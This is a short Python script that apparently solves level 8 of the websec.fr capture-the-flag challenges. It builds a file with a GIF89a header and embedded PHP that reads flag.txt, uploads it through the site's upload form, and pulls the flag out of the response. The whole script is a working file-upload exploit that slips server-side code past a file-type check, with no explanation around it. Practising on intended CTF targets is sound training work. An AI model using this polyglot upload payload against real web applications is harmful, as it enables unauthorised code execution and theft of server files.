import httpx
import re

url = "https://websec.fr/level08/index.php"

with open('solve.gif', 'wb') as f:
    f.write(b'GIF89a')
    f.write(b'<?php echo readfile("flag.txt"); ?>')

file = { 'fileToUpload' : open('solve.gif', 'rb') }
r = httpx.post(url, files = file, data = { 'submit' : 'Upload' })
flag = re.search(r'WEBSEC\{.*\}', r.text)[0]

print(flag)